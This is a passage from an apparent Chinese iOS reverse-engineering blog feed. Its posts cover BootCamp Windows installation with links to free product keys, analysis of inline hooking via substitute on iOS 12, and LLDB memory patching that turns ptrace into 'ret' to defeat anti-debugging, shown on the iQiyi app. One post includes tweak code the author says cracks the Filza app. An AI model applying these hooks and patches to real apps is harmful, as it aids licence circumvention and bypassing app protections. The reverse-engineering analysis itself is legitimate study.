<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-08-21T17:19:45.591Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BootCamp安装Windows笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/21/mac-install-windows/mac-install-windows/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/21/mac-install-windows/mac-install-windows/</id>
    <published>2019-08-21T05:44:54.000Z</published>
    <updated>2019-08-21T17:19:45.591Z</updated>
    
    <content type="html"><![CDATA[<h3 id="BootCamp安装Windows笔记"><a href="#BootCamp安装Windows笔记" class="headerlink" title="BootCamp安装Windows笔记"></a>BootCamp安装Windows笔记</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>mac安装Windows？这个话题你出来肯定就有人跳出来说，mac装什么Windows？或者说用虚拟机不行吗？这里并不想去讨论这个问题。对于我来说，装Windows双系统主要是为了用IDA。而虚拟机太慢太卡，不太适合，所以我准备用mac装Windows系统试试。这也是我第一次装Windows双系统，基本把所有的坑踩了一遍。如果你现在想装Windows或者正遇到问题，那么这篇笔记应该能解决你的问题。我会尽可能把我在安装过程中遇到的问题以及解决方案都描述清楚。</p><h4 id="BootCamp？"><a href="#BootCamp？" class="headerlink" title="BootCamp？"></a>BootCamp？</h4><p>早就听说在最新的macOS系统版本中，用BootCamp能很简单的安装Windows，既然如此决定先用BootCamp试试。这里你首先需要下载一个Windows的iso镜像文件，我这里提供几个下载的地址</p><ul><li><a href="https://msdn.itellyou.cn/" target="_blank" rel="external">https://msdn.itellyou.cn/</a> </li><li><a href="https://tb.rg-adguard.net/public.php?lang=zh-CN" target="_blank" rel="external">https://tb.rg-adguard.net/public.php?lang=zh-CN</a></li><li><a href="https://www.microsoft.com/zh-cn/software-download/windows10ISO" target="_blank" rel="external">https://www.microsoft.com/zh-cn/software-download/windows10ISO</a> （我是在官网下载的镜像）</li></ul><p>win10镜像准备好以后，用BootCamp装的时候选择该镜像并分配50G的分区。点击下一步，下载完相关驱动以后（连VPN，不然有点慢）进行分区，结果就提示分区失败了。去网上搜了一下，大多数人都说由于最新分区采用的APFS导致得，一堆解决方案。主要都说采用系统降级的方式，或者由于修复time machine造成的分区错误，或者磁盘加密的缘故。但是很明显我刚装的系统不存在这些问题。</p><p>又重新尝试了几次，还是不行，快怀疑苹果BootCamp的问题了。</p><p>还有人提示可以进入单用户模式（command+s）然后用<code>fsck_apfs</code>或者<code>fsck</code>命令去修复磁盘。</p><p>但是上面的都做了以后还是不行。</p><h4 id="启动盘-手动分区"><a href="#启动盘-手动分区" class="headerlink" title="启动盘+手动分区"></a>启动盘+手动分区</h4><p>既然BootCamp自动安装不了，那选择手动安装吧。这个原理也不复杂，BootCamp最主要工作在于下载驱动+分区+引导win系统。然后这些我们实际上可以手动完成。</p><ul><li><p><strong>制作启动盘</strong></p><p>这里可以找一个U盘来制作win10的启动盘，由于我这里是移动硬盘，所以我分了一个10G的区来作为启动盘。这里制作需要<a href="https://unetbootin.github.io/" target="_blank" rel="external">unetbootin</a>来完成制作，这个软件支持mac、win、linux平台。我下载了mac版的。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/mac-install-windows/image-20190822003218038.png?raw=true" width="500" hegiht="187"></p><p>分别选择win10的iso镜像，以及选择对应的设备。如果不清楚你的设备是哪一个，可以输入<code>diskutil list</code>去找到对应的设备名，点击ok等待一会，就这样启动盘就制作完成了。</p></li></ul><ul><li><p><strong>手动分区</strong></p><p>这里的分区是指将mac主硬盘分一个区来安装Windows，由于这里需要安装Windows，所以只能用Windows支持的磁盘格式，最开始我分了一个50G的FAT32分区，然后用启动盘安装发现不能选择该磁盘。后面经过一番研究，才发现。Windows磁盘需要NTFS格式的分区，但是这里有个问题在于mac不支持NTFS格式的操作。于是乎，搜索了一番，发现可以安装一些软件、驱动让mac支持NTFS格式。这里提供两种软件供参考<a href="http://www.ntfsformac.cn/xiazai.html" target="_blank" rel="external">ParagonNTFS</a>和<a href="https://www.tuxera.com/products/tuxera-ntfs-for-mac-cn/" target="_blank" rel="external">tuxera-ntfs</a>但都是收费的。安装完以后终于能分NTFS格式的区了，但是有个头疼的问题在于只能分30G以下才会成功，大于30G就提示失败。但是如果分区是30G的话，启动盘选择磁盘的时候又会提示需要大于40G的磁盘，这里不是矛盾了吗。</p></li></ul><h4 id="重装mac系统"><a href="#重装mac系统" class="headerlink" title="重装mac系统"></a>重装mac系统</h4><p>由于上面手动分区也不行，我就重装了mac系统。由于我之前制作了mojave最新系统的mac启动盘，所以重装还是比较快。建议制作一个mac系统盘备用。这里简单说下制作过程。</p><ul><li>同样给硬盘分一个10G的区</li><li>下载macOS系统，这里比如<code>Install macOS Mojave</code></li><li><code>sudo /Applications/Install\ macOS\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume</code>执行里面的createinstallmedia命令，选择上面的分区就制作完成了。</li></ul><p>如果还有问题可以点<a href="https://support.apple.com/zh-cn/HT201372" target="_blank" rel="external">这里</a></p><p>重装完以后，我试了下用BootCamp安装，发现一路畅通，直接到引导了Windows系统安装的步骤，但是这里又有问题了。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/mac-install-windows/image-20190822004521105.png?raw=true" width="500" hegiht="187"></p><p>WTF？你自己刚分好的区，现在又给我说不行了？这里还真没办法。不过我回到macOS用磁盘工具发现，虽然不能安装Windows，但却给我分好了一个NTFS格式的区。既然有了这个区，那我直接用上面制作的启动盘手动安装Windows不就完了。</p><p>重启电脑，按住option按钮，选择那个win启动盘，到选择Windows安装磁盘的步骤，发现BootCamp分的那个区是可以用的，于是我就格式化了那个磁盘，然后选择它，果然安装成功了。这一刻我饱含泪水，终于把Windows安装成功了。经过一番设置，顺利进入win10系统，顺便说下感觉win10还不错，无论是画质还是系统设计，已经比win7好太多。</p><p>当我以为一切就这样结束的时候，发现Windows不能连wifi，不过突然想起，由于我是手动安装的Windows，所以并没有安装相关驱动，导致wifi模块并不能识别。还好BootCamp提供了手动下载驱动支持文件的选项，这里由于需要在win10中访问并运行驱动安装程序，所以我又分了一个FAT32的区专门提供win10访问。把下载的驱动程序放入这个分区，重启进入win10系统，运行里面的安装程序以后，wifi就能连接上了。</p><p>最后我为了体验完整的win10系统，还在淘宝上买了一个激活码，成功激活为正版win10。不过我这里也提供几个免费的key，但不一定可靠，嫌麻烦可以花几块钱去淘宝买。</p><ul><li><a href="https://productkeysdl.com/windows-10-product-key/" target="_blank" rel="external">https://productkeysdl.com/windows-10-product-key/</a></li><li><a href="http://www.ylmfwin100.com/ylmf/8642.html" target="_blank" rel="external">http://www.ylmfwin100.com/ylmf/8642.html</a></li></ul><h4 id="其他资源"><a href="#其他资源" class="headerlink" title="其他资源"></a>其他资源</h4><p>dll缺失文件下载</p><ul><li><p><a href="https://cn.dll-files.com/" target="_blank" rel="external">https://cn.dll-files.com/</a></p></li><li><p><a href="http://www.win10jihuoma.com/archives/8183" target="_blank" rel="external">http://www.win10jihuoma.com/archives/8183</a></p></li></ul><h4 id="最后使用体验"><a href="#最后使用体验" class="headerlink" title="最后使用体验"></a>最后使用体验</h4><p>win10装好以后，体验了下IDA，加载dyld_cache后发现是真的比mac和虚拟机装的IDA流畅很多。也不费我这么多精力去装双系统。不过由于我的mac磁盘一共才256G，所以我下一步的打算是买一个移动SSD硬盘来装Windows，整个系统都运行在外置的SSD硬盘，看了下现在移动固态硬盘的速度，应该是没什么问题的。暂选三星T5、500G、540M/s那款。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://apple.stackexchange.com/questions/304623/bootcamp-problem-unable-to-partition-the-disk" target="_blank" rel="external">https://apple.stackexchange.com/questions/304623/bootcamp-problem-unable-to-partition-the-disk</a></li><li><a href="https://www.microsoft.com/zh-cn/software-download/windows10ISO" target="_blank" rel="external">https://www.microsoft.com/zh-cn/software-download/windows10ISO</a></li><li><a href="https://www.hongkiat.com/blog/bootcamp-assistant-cannot-partition/" target="_blank" rel="external">https://www.hongkiat.com/blog/bootcamp-assistant-cannot-partition/</a></li><li><a href="http://www.win10jihuoma.com/archives/category/win10zhuanyeban" target="_blank" rel="external">http://www.win10jihuoma.com/archives/category/win10zhuanyeban</a></li><li><a href="https://discussions.apple.com/thread/6832480" target="_blank" rel="external">https://discussions.apple.com/thread/6832480</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;BootCamp安装Windows笔记&quot;&gt;&lt;a href=&quot;#BootCamp安装Windows笔记&quot; class=&quot;headerlink&quot; title=&quot;BootCamp安装Windows笔记&quot;&gt;&lt;/a&gt;BootCamp安装Windows笔记&lt;/h3&gt;&lt;h4 i
      
    
    </summary>
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/wiki/"/>
    
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/wiki/"/>
    
      <category term="windows" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>iOS12内存patch remap bug分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/</id>
    <published>2019-08-15T16:22:28.000Z</published>
    <updated>2019-08-20T07:18:00.086Z</updated>
    
    <content type="html"><![CDATA[<h3 id="iOS12内存patch-remap-bug分析"><a href="#iOS12内存patch-remap-bug分析" class="headerlink" title="iOS12内存patch remap bug分析"></a>iOS12内存patch remap bug分析</h3><blockquote><p>之前在做LLDB中的内存patch的时候提到在iOS12(包括iOS11)上面remap会出现bug的问题，一直相当困扰。其他hook框架都能在最新越狱上面正常patch，为什么我写的就不行？所以这篇文章准备一探究竟，但是在目前为止我也没有弄懂原因。不过这里会先分析最新系统上面两张hook框架对于inlinehook的原理及其相关细节。先看下他们的hook框架是如何实现内存patch和hook的。</p></blockquote><h4 id="iOS12-MSHookFunction分析-CoolStar越狱工具"><a href="#iOS12-MSHookFunction分析-CoolStar越狱工具" class="headerlink" title="iOS12 MSHookFunction分析(CoolStar越狱工具)"></a>iOS12 MSHookFunction分析(CoolStar越狱工具)</h4><p>在iOS12越狱上面<code>CydiaSubstrate</code>指向的是<code>libsubstrate.dylib</code></p><p><code>/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate -&gt; ../../../usr/lib/libsubstrate.dylib</code></p><p>我们常用的<code>MSHookFunction</code>函数的实现就是在<code>libsubstrate.dylib</code>这里面，不过在这里仅仅是<code>SubHookFunction</code>的封装。而<code>SubHookFunction</code>的实现却是在<code>/usr/lib/libsubstitute.0.dylib</code>这里</p><p><code>/usr/lib/libsubstitute.0.dylib</code>是一个软连接指向<code>libsubstitute.dylib</code>。这里的<code>libsubstitute.dylib</code>就是coolstar维护的版本。下面分析<code>libsubstitute.dylib</code>的inlinehook实现细节。</p><p>下面是我写的一个tweak插件代码（<del>没错就是破解Filza的，不过只是部分代码</del>），hook了<code>_ZTL7624417887</code>函数。</p><pre><code class="c">static BOOL (*original_ZTL7624417887)(int a1, int a2, int a3); BOOL new_ZTL7624417887(int a1, int a2, int a3){    NSLog(@&quot;====xxxx===hook ZTL7624417887---&gt;%d&quot;, 0);    return 0;}%ctor{        MSImageRef  image =  MSGetImageByName(&quot;/Applications/Filza.app/Filza&quot;);    NSLog(@&quot;===xxx===image:%p&quot;, image);    void* ZTL7624417887 = (void*)MSFindSymbol(image, &quot;_ZTL7624417887&quot;);    NSLog(@&quot;===xxx===ZTL7624417887:%p&quot;, ZTL7624417887);    MSHookFunction((void*)ZTL7624417887, (void*)new_ZTL7624417887, (void**)&amp;original_ZTL7624417887);}</code></pre><p><strong>调试分析</strong></p><p>对<code>MSHookFunction</code>下断点，发现断在了我们预想的位置。</p><pre><code>CydiaSubstrate`MSHookFunction:-&gt;  0x10550fca0 &lt;+0&gt;:  cbz    x0, 0x10550fca8           ; &lt;+8&gt;    0x10550fca4 &lt;+4&gt;:  b      0x10550fe80               ; symbol stub for: SubHookFunction    0x10550fca8 &lt;+8&gt;:  ret</code></pre><pre><code>(lldb) re re General Purpose Registers:        x0 = 0x000000010489a068  Filza`ZTL7624417887        x1 = 0x00000001055bbbec  xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19        x2 = 0x00000001055bc148  xkfilza.dylib`original_ZTL7624417887</code></pre><pre><code>* frame #0: 0x000000010550fca0 CydiaSubstrate`MSHookFunction    frame #1: 0x00000001055bbcd0 xkfilza.dylib`_logosLocalCtor_9eb4d9ed(argc=1, argv=0x000000016b657b50, envp=0x000000016b657b60) at Tweak.xm:29    frame #2: 0x00000001055df56c dyld`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 424    frame #3: 0x00000001055df7ac dyld`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 40</code></pre><p>X0就是hook的函数地址，X1为替换的函数地址，X2为保存的原函数地址。</p><p>先看一下这三个地址的数据，如下所见，此时<code>ZTL7624417887</code>还没有hook，所以前几个指令没有变化。</p><pre><code>// ZTL7624417887 函数指令(lldb) x/5i 0x000000010489a068    0x10489a068: 0xd2800008   mov    x8, #0x0    0x10489a06c: 0xf0003489   adrp   x9, 1683    0x10489a070: 0x911a4129   add    x9, x9, #0x690            ; =0x690     0x10489a074: 0xb868792a   ldr    w10, [x9, x8, lsl #2]    0x10489a078: 0x6b00015f   cmp    w10, w0// new_ZTL7624417887 函数指令(lldb) x/5i 0x00000001055bbbec    0x1055bbbec: 0xd503237f   pacibsp     0x1055bbbf0: 0xd100c3ff   sub    sp, sp, #0x30             ; =0x30     0x1055bbbf4: 0xa9027bfd   stp    x29, x30, [sp, #0x20]    0x1055bbbf8: 0x910083fd   add    x29, sp, #0x20            ; =0x20     0x1055bbbfc: 0xb81fc3a0   stur   w0, [x29, #-0x4]// original_ZTL7624417887 是一个函数指针(lldb) x/5g 0x00000001055bc1480x1055bc148: 0x0000000000000000 0x00000000000000000x1055bc158: 0x0000000000000000 0x00000000000000000x1055bc168: 0x0000000000000000</code></pre><p>这里是我们单步执行两次，使其执行hook函数。这次再观察一下这三个地址的数据</p><pre><code>// ZTL7624417887 函数指令(lldb) x/5i 0x000000010489a068    0x10489a068: 0xb0006911   adrp   x17, 3361    0x10489a06c: 0x912fb231   add    x17, x17, #0xbec          ; =0xbec     0x10489a070: 0xd61f0220   br     x17    0x10489a074: 0xb868792a   ldr    w10, [x9, x8, lsl #2]    0x10489a078: 0x6b00015f   cmp    w10, w0// new_ZTL7624417887 函数指令(lldb) x/5i 0x00000001055bbbec    0x1055bbbec: 0xd503237f   pacibsp     0x1055bbbf0: 0xd100c3ff   sub    sp, sp, #0x30             ; =0x30     0x1055bbbf4: 0xa9027bfd   stp    x29, x30, [sp, #0x20]    0x1055bbbf8: 0x910083fd   add    x29, sp, #0x20            ; =0x20     0x1055bbbfc: 0xb81fc3a0   stur   w0, [x29, #-0x4]// original_ZTL7624417887 是一个函数指针(lldb) x/5g 0x00000001055bc1480x1055bc148: 0x0000000106e38000 0x00000000000000000x1055bc158: 0x0000000000000000 0x00000000000000000x1055bc168: 0x0000000000000000</code></pre><p>这里发现原函数前三个字节和<code>original_ZTL7624417887</code>这个函数指令数据都发生了变化。</p><pre><code class="assembly">0x10489a068: 0xb0006911   adrp   x17, 33610x10489a06c: 0x912fb231   add    x17, x17, #0xbec          ; =0xbec 0x10489a070: 0xd61f0220   br     x17</code></pre><p>这三条指令就是将原始执行流跳转到其他地址（这里也可以发现hook的函数至少大于3条指令，不然会覆盖其他函数）。这里简单计算就可以算出X17目标地址</p><pre><code>(lldb) p/x (0x10489a068 &amp; ~(0x1000-0x1))+ (3361&lt;&lt;12) + 0xbec(long) $3 = 0x00000001055bbbec</code></pre><p>所以会跳转到<code>0x00000001055bbbec</code>这个地址，等等！这个地址不就是<code>new_ZTL7624417887</code>我们hook代码的函数地址吗？所以函数hook就是通过修改前三条指令跳转到我们定义的函数来实现hook的。</p><p>这里还有个问题在于，如果我们在hook代码里面需要执行原函数，那么<code>original_ZTL7624417887</code>处保存的又是什么函数指针？所以这里跟一下<code>0x0000000106e38000</code>这个地址。</p><pre><code>(lldb) x/12i 0x0000000106e38000    0x106e38000: 0xd2800008   mov    x8, #0x0    0x106e38004: 0xd29a0009   mov    x9, #0xd000    0x106e38008: 0xf2a09e49   movk   x9, #0x4f2, lsl #16    0x106e3800c: 0xf2c00029   movk   x9, #0x1, lsl #32    0x106e38010: 0x911a4129   add    x9, x9, #0x690            ; =0x690     0x106e38014: 0xd0fed311   adrp   x17, -9630    0x106e38018: 0x9101d231   add    x17, x17, #0x74           ; =0x74     0x106e3801c: 0xd61f0220   br     x17</code></pre><p>这里可以看出也是一个跳转，可以计算出X17跳转后的地址</p><pre><code>(lldb) p/x (0x106e38014 &amp; ~(0x1000-0x1)) - (9630&lt;&lt;12) + 0x74(long) $4 = 0x000000010489a074</code></pre><p>再等等！这个地址不就是<code>ZTL7624417887</code>函数的第四条指令的地址吗，跳转到这里正好调用了原函数，但是有个问题在于，原函数的前三条指令去哪了？仔细观察上面的指令和原函数的前三条指令</p><pre><code>//原函数前三条指令0x10489a068: 0xd2800008   mov    x8, #0x00x10489a06c: 0xf0003489   adrp   x9, 16830x10489a070: 0x911a4129   add    x9, x9, #0x690            ; =0x690// original_ZTL7624417887函数指针的指令0x106e38000: 0xd2800008   mov    x8, #0x00x106e38004: 0xd29a0009   mov    x9, #0xd0000x106e38008: 0xf2a09e49   movk   x9, #0x4f2, lsl #160x106e3800c: 0xf2c00029   movk   x9, #0x1, lsl #320x106e38010: 0x911a4129   add    x9, x9, #0x690            ; =0x690</code></pre><p>稍加思索就知道，虽然指令不一样，但是结果却是一样的。为什么不直接写入原三条指令呢？这里涉及到<code>adrp</code>这个指令的相对寻址问题。由于<code>adrp</code>会根据当前pc值来计算，这样直接复制的话pc值已经变化，所以这里不得不重新计算X9的值。到这里，<code>MSHookFunction</code>的hook过程我们已经完全清楚了。</p><h4 id="iOS12-MSHookFunction分析-unc0ver越狱工具"><a href="#iOS12-MSHookFunction分析-unc0ver越狱工具" class="headerlink" title="iOS12 MSHookFunction分析(unc0ver越狱工具)"></a>iOS12 MSHookFunction分析(unc0ver越狱工具)</h4><p>由于saurik不给CoolStar的越狱工具提供substrate和cydia的支持，导致现在越狱工具出现了两种hook框架。以Coolstar团队基于开源代码substitute和pwn20wnd团队的substrate两种hook框架。上面分析了substitute的hook原理。下面分析substrate的hook相关细节。这里多说两句，关于整个事件，可以访问CoolStar的博客<a href="https://coolstarorg.tumblr.com/" target="_blank" rel="external">https://coolstarorg.tumblr.com/</a>他介绍了整个事件以及自己开发移植substitute的完整过程。我个人来说，还是十分崇拜CoolStar那份创新和坚持。自己动手完成了最新越狱的substitute移植，tweak注入，以及Sileo的开发。在这中间的过程，正如他在博客里面提到的那样，十分曲折，令人佩服。</p><p>待完成…</p><h4 id="MSHookFunction如何解决内存patch的问题"><a href="#MSHookFunction如何解决内存patch的问题" class="headerlink" title="MSHookFunction如何解决内存patch的问题"></a>MSHookFunction如何解决内存patch的问题</h4><p>由于<code>substitute</code>开源的，所以可以结合源码分析。源码在<a href="https://github.com/coolstar/substitute">这里</a></p><p><code>SubHookFunction</code>函数伪代码，此时的函数参数为</p><pre><code>x0 = 0x00000001005de068  Filza`ZTL7624417887x1 = 0x0000000102c9bbec  xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19x2 = 0x0000000102c9c148  xkfilza.dylib`original_ZTL7624417887</code></pre><p>就是原函数地址，替换的函数地址，保存原函数地址的指针</p><pre><code class="c">__int64 __fastcall SubHookFunction(__int64 a1, __int64 a2, __int64 a3){  __int64 result; // x0  FILE *v4; // x19  __int64 v5; // ST00_8  __int64 v6; // [xsp+10h] [xbp-30h]  __int64 v7; // [xsp+18h] [xbp-28h]  __int64 v8; // [xsp+20h] [xbp-20h]  int v9; // [xsp+28h] [xbp-18h]  v6 = a1;  v7 = a2;  v8 = a3;  v9 = 0;  result = substitute_hook_functions((__int64)&amp;v6, 1uLL, 0LL, 1);  if ( (_DWORD)result )  {    v4 = __stderrp;    v5 = substitute_strerror();    fprintf(v4, &quot;SubHookFunction: substitute_hook_functions returned %s\n&quot;, v5);    abort();  }  return result;}</code></pre><p>对应源码<code>substitute/lib/darwin/substrate-compat.c</code></p><pre><code class="c">void SubHookFunction(void *symbol, void *replace, void **result)    __asm__(&quot;SubHookFunction&quot;);void SubHookFunction(void *symbol, void *replace, void **result) {    struct substitute_function_hook hook = {symbol, replace, result};    int ret = substitute_hook_functions(&amp;hook, 1, NULL,                                        SUBSTITUTE_NO_THREAD_SAFETY);    if (ret) {        substitute_panic(&quot;SubHookFunction: substitute_hook_functions returned %s\n&quot;,                         substitute_strerror(ret));    }}</code></pre><p>再跟一下到<code>substitute_hook_functions</code>函数。</p><p>对应源码<code>substitute/lib/hook-functions.c</code></p><p>还在分析中…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/coolstar/electra/issues/233">https://github.com/coolstar/electra/issues/233</a></li><li><a href="https://github.com/coolstar/electra/blob/master/docs/getting-started.md#platformizing-a-binary">https://github.com/coolstar/electra/blob/master/docs/getting-started.md#platformizing-a-binary</a></li><li><a href="https://github.com/ipasimulator/lldb">https://github.com/ipasimulator/lldb</a></li><li><a href="https://github.com/BishopFox/bfinject">https://github.com/BishopFox/bfinject</a></li><li><a href="https://coolstarorg.tumblr.com/" target="_blank" rel="external">https://coolstarorg.tumblr.com/</a></li><li><a href="http://www.newosxbook.com/articles/CodeSigning.pdf" target="_blank" rel="external">http://www.newosxbook.com/articles/CodeSigning.pdf</a></li><li><a href="https://github.com/frida/frida-gum/commit/30deb2c29f060948407b585c4b23475ea60b965b">https://github.com/frida/frida-gum/commit/30deb2c29f060948407b585c4b23475ea60b965b</a></li><li><a href="https://github.com/Siguza/ios-resources/blob/master/bits/arm64.md">https://github.com/Siguza/ios-resources/blob/master/bits/arm64.md</a></li><li><a href="https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c">https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;iOS12内存patch-remap-bug分析&quot;&gt;&lt;a href=&quot;#iOS12内存patch-remap-bug分析&quot; class=&quot;headerlink&quot; title=&quot;iOS12内存patch remap bug分析&quot;&gt;&lt;/a&gt;iOS12内存patch r
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="hook" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>iOS LLDB中反反调试分析与实现</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/</id>
    <published>2019-08-12T11:16:01.000Z</published>
    <updated>2019-08-13T17:41:50.131Z</updated>
    
    <content type="html"><![CDATA[<h3 id="iOS-LLDB中反反调试分析与实现"><a href="#iOS-LLDB中反反调试分析与实现" class="headerlink" title="iOS LLDB中反反调试分析与实现"></a>iOS LLDB中反反调试分析与实现</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于反调试和反反调试，已经有很多人分析过了，也有很多解决方案。但是在LLDB中做反反调试还没人做过，这也是我一直想解决的一个方案，毕竟本身就是为了调试，那么在LLDB直接输入一行命令就能反反调试应该相对酸爽。本文将介绍一种基于内存单指令patch的方式进行反反调试的方案，大概意思就是通过直接修改代码段的指令来绕过反调试机制。</p><h4 id="目前反调试与反反调试情况"><a href="#目前反调试与反反调试情况" class="headerlink" title="目前反调试与反反调试情况"></a>目前反调试与反反调试情况</h4><p>这里庆哥写了一遍文章分析了 <a href="http://iosre.com/t/topic/8179" target="_blank" rel="external">关于反调试&amp;反反调试那些事</a></p><p>这里简单归纳一下，有如下几种：</p><ul><li>ptrace</li><li>sysctl</li><li>syscall</li><li>SIGTOP</li><li>task_get_exception_ports</li></ul><p>这里实际上就大概三种，其他都是基于ptrace的变种。ptrace这个函数是linux就提供的一个接口，常常用作linux系的反调试，本质就是通过26号系统调用来完成的，目前大多反调试都利用该方案。</p><p>后面看到庆哥同样提供了一个反反调试的LLDB脚本，不过看了下和我的思路还是不一样的。（<del>差点以为白做了）</del></p><p>正如文章里面写到通过<code>lldb</code>下断点，然后修改参数，或者直接返回也可以达到反反调试的效果。由于要不断去检查执行状态等，或者程序有定时器定时检测，这个脚本影响性能及变得很卡影响调试体验。不过还是膜庆哥的方案，学习了。</p><h4 id="内存patch实现反反调试"><a href="#内存patch实现反反调试" class="headerlink" title="内存patch实现反反调试"></a>内存patch实现反反调试</h4><p>说一下大概思路：</p><ul><li>内存中找到<code>ptrace</code>地址</li><li>将该内存map为<code>rwx</code></li><li><p>直接将首调指令修改为<code>ret</code>指令</p><p>刚开始以为就这样简单就完了，结果实际写代码的时候才发现过程远比想象中复杂。</p></li></ul><p>由于iOS不允许直接将代码段map为写权限，这里调用<code>mach_vm_protect</code>或<code>mprotect</code>都会异常。但是类似frida、substitute以及hookzz都能进行指令hook。这样说来，肯定是可以修改代码段的。看了下substitute以及frida中关于这块的实现，才发现可以用一种remap的方式修改代码段。</p><p>大致的流程如下：</p><ul><li>使用mmap新建一块内存，把这块内存叫做new</li><li>使用vm_copy把想要篡改的处于__text段内的内存（把这块内存叫target）拷贝到new里</li><li>向new里写入想执行的代码</li><li>调用mprotect把new改为rx。因为mmap出来的内存的max_protection是rwx，所以这里mprotect改权限没问题</li><li>调用mach_vm_remap把new的内容反映回target里</li></ul><p>不过当我写代码测试的时候发现，remap以后整个页数据都变成了0。实在不清楚原因，向Zz求助，Zz直接扔了我他实现这块的代码。我看了以后收益匪浅，只怪之前没分析hookzz的具体实现。后面才知道由于我的设备是iOS12，Zz意思是codesign的问题，hookZz也没支持。于是换了一台iOS9的设备，果然就可以了，向Zz低头。</p><p>期间还由于我手残忘记调用mprotect把new改为rx。导致直接执行异常，用<code>memory region</code>查看地址才知道页保护属性为<code>rw</code>。</p><p>相关代码如下：</p><p>1、map new page for patch</p><pre><code class="c">    // map new page for patch    void *new = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);    if (!new ){        NSLog(@&quot;[-] mmap failed!&quot;);        return;    }    NSLog(@&quot;[*] new map address:%p&quot;, new);</code></pre><p>2、start patch</p><pre><code class="c">    // start patch        kret = vm_copy(self_task, (unsigned long)page_start, 0x1000, (vm_address_t) new);    if (kret != KERN_SUCCESS){        NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno);        return;    }    char patch_ret_ins_data[4] = {0xc0, 0x03, 0x5f, 0xd6}; // ret     memcpy((void *)(new+patch_offset), patch_ret_ins_data, 4);    NSLog(@&quot;[*] new map+offset address:%p&quot;, (void *)(new+patch_offset));</code></pre><p>3、set new page back to r-x</p><pre><code class="c">    // set back to r-x    int ret = mprotect(new, 0x1000, PROT_READ | PROT_EXEC);    NSLog(@&quot;[*] ret: %d, errno: %d, addr: %p&quot;, ret, errno, new);</code></pre><p>4、remap the target page</p><pre><code class="c">    kret = mach_vm_remap(mach_task_self(), &amp;target, 0x1000, 0,                       VM_FLAGS_OVERWRITE, self_task,                       (mach_vm_address_t) new, TRUE,                       &amp;c, &amp;m, inherit);    if(kret != KERN_SUCCESS){        NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno);        return;    }    NSLog(@&quot;[*] now ptrace_ptr address:%p&quot;, ptrace_ptr)</code></pre><p>5、clear cache</p><pre><code class="c">    void* clear_start_ = (void*)page_start + patch_offset;  sys_icache_invalidate (clear_start_, 4);  sys_dcache_flush (clear_start_, 4);</code></pre><p>完整的代码在xia0LLDB里面已经集成：<a href="https://github.com/4ch12dy/xia0LLDB">https://github.com/4ch12dy/xia0LLDB</a></p><h4 id="一个简单反反调试实验"><a href="#一个简单反反调试实验" class="headerlink" title="一个简单反反调试实验"></a>一个简单反反调试实验</h4><p>这里以爱奇艺为例子分析，爱奇艺在main函数里面动态调用了ptrace函数进行反调试。</p><ul><li><p>后台启动方式启动爱奇艺</p><pre><code class="shell">xia0 ~ $ issh debug -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo[I]:iproxy process for 2222 port alive, pid=16264 [I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [I]:iOSRE dir exist [I]:iproxy process for 1234 port alive, pid=16428 [I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null) [I]:/iOSRE/tools/debugserver file exist, Start debug... 